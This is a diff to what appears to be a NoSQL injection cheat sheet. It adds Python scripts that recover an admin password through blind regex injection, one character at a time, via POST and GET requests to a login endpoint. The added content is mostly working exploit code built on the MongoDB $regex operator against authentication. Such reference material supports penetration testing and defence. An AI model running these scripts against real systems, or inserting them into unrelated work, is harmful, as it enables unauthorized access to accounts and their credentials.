@@ -50,6 +50,9 @@ Extract data with "in"
 
 ## Blind NoSQL
 
+### POST with JSON body
+
+
 ```python
 import requests
 import urllib3
@@ -59,6 +62,7 @@ urllib3.disable_warnings()
 
 username="admin"
 password=""
+u="http://example.org/login"
 
 while True:
     for c in string.printable:
@@ -68,6 +72,29 @@ while True:
             if 'OK' in r.text:
                 print("Found one more char : %s" % (password+c))
                 password += c
+```
+
+### GET
+
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username='admin'
+password=''
+u='http://example.org/login'
+
+while True:
+  for c in string.printable:
+    if c not in ['*','+','.','?','|', '#', '&', '$']:
+      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
+      r = requests.get(u + payload)
+      if 'Yeah' in r.text:
+        print("Found one more char : %s" % (password+c))
+        password += c
 ```
 
 ## MongoDB Payloads
